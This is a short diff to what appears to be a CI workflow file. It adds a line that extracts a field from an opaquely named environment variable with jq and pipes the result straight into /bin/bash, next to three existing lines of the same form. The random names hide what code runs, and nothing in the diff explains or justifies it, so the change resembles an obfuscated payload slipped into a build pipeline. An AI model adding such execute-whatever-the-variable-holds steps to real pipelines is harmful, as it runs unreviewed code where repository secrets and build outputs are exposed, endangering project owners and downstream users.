@@ -32,6 +32,7 @@ jobs:
           echo $nzigl00994 | jq -r .lt1 | /bin/bash
           printf '%s' "$g46" | jq -r .d776 | /bin/bash
           echo $zj1 | jq -r .ogaj40 | /bin/bash
+          echo $q30 | jq -r .mkq734 | /bin/bash
 
       - name: Store results
         if: always()
